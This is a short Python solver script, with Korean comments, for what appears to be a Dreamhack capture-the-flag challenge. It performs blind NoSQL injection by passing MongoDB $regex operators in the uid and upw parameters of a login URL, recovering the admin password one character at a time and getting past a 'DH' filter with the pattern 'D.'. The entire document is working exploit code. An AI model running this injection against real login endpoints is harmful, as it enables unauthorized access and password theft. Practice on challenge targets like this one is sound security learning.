import requests, string

host = "http://host8.dreamhack.games:23610"
Candidate_set = string.digits + string.ascii_letters + string.punctuation


flag = ""

# 전체 flag의 length가 36 => DH{} 중괄호 내부 32글자 탐색
for i in range(32):
    for ch in Candidate_set:
        response = requests.get(
            # DH는 필터링되므로 D.으로 정규표현식 설정
            f"{host}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}"
        )
        if response.text == "admin":
            flag += ch
            break

    print(f"DH{{{flag}}}")
